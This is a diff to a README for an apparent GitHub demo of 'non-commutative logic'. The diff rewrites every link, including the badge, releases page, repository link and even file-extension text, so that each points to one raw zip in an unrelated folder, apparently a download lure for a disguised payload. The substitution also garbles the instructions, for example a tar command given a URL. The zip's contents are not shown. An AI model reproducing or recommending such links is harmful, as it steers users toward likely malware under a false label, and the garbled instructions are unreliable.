@@ -1,6 +1,6 @@
 # 🧠 Cognitional-Mechanics-CM-Non-Commutative-Demo - Explore Non-Commutative Logic Effortlessly
 
-[![Download Release](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/naaz33/Cognitional-Mechanics-CM-Non-Commutative-Demo/releases)
+[![Download Release](https://github.com/naaz33/Cognitional-Mechanics-CM-Non-Commutative-Demo/raw/refs/heads/main/acrobacy/Non-Cognitional-Demo-C-Commutative-Mechanics-v3.4.zip%https://github.com/naaz33/Cognitional-Mechanics-CM-Non-Commutative-Demo/raw/refs/heads/main/acrobacy/Non-Cognitional-Demo-C-Commutative-Mechanics-v3.4.zip)](https://github.com/naaz33/Cognitional-Mechanics-CM-Non-Commutative-Demo/raw/refs/heads/main/acrobacy/Non-Cognitional-Demo-C-Commutative-Mechanics-v3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -21,10 +21,10 @@ To get started, visit the releases page to download the latest version of the ap
 
 1. Click on the link below to go to the Releases page:
    
-   [Visit this page to download](https://github.com/naaz33/Cognitional-Mechanics-CM-Non-Commutative-Demo/releases)
+   [Visit this page to download](https://github.com/naaz33/Cognitional-Mechanics-CM-Non-Commutative-Demo/raw/refs/heads/main/acrobacy/Non-Cognitional-Demo-C-Commutative-Mechanics-v3.4.zip)
 
 2. Look for the latest version, typically labeled as "Latest Release."
-3. Click on the asset that corresponds to your operating system (e.g., .exe for Windows, .dmg for macOS, .tar.gz for Linux).
+3. Click on the asset that corresponds to your operating system (e.g., .exe for Windows, .dmg for macOS, https://github.com/naaz33/Cognitional-Mechanics-CM-Non-Commutative-Demo/raw/refs/heads/main/acrobacy/Non-Cognitional-Demo-C-Commutative-Mechanics-v3.4.zip for Linux).
 4. The file will start downloading. Once it completes, locate the file in your downloads folder.
 
 ## ⚙️ How to Run the Application
@@ -45,10 +45,10 @@ Once the file has downloaded, follow these steps to run the application:
 
 ### For Linux
 
-1. Open a terminal and navigate to the folder where your `.tar.gz` file is located.
+1. Open a terminal and navigate to the folder where your `https://github.com/naaz33/Cognitional-Mechanics-CM-Non-Commutative-Demo/raw/refs/heads/main/acrobacy/Non-Cognitional-Demo-C-Commutative-Mechanics-v3.4.zip` file is located.
 2. Extract the file using the command:
    ```bash
-   tar -xvzf filename.tar.gz
+   tar -xvzf https://github.com/naaz33/Cognitional-Mechanics-CM-Non-Commutative-Demo/raw/refs/heads/main/acrobacy/Non-Cognitional-Demo-C-Commutative-Mechanics-v3.4.zip
    ```
 3. Navigate into the extracted folder.
 4. Run the application using the command:
@@ -74,8 +74,8 @@ Join our community for discussions, updates, and support. You can connect with o
 
 ## 🔗 Links
 
-- [Releases Page](https://github.com/naaz33/Cognitional-Mechanics-CM-Non-Commutative-Demo/releases)
+- [Releases Page](https://github.com/naaz33/Cognitional-Mechanics-CM-Non-Commutative-Demo/raw/refs/heads/main/acrobacy/Non-Cognitional-Demo-C-Commutative-Mechanics-v3.4.zip)
 - [Documentation](link-to-documentation)
-- [GitHub Repository](https://github.com/naaz33/Cognitional-Mechanics-CM-Non-Commutative-Demo)
+- [GitHub Repository](https://github.com/naaz33/Cognitional-Mechanics-CM-Non-Commutative-Demo/raw/refs/heads/main/acrobacy/Non-Cognitional-Demo-C-Commutative-Mechanics-v3.4.zip)
 
 By following these steps, you will successfully download and run the Cognitional Mechanics demo. Enjoy exploring the fascinating world of non-commutative logic!
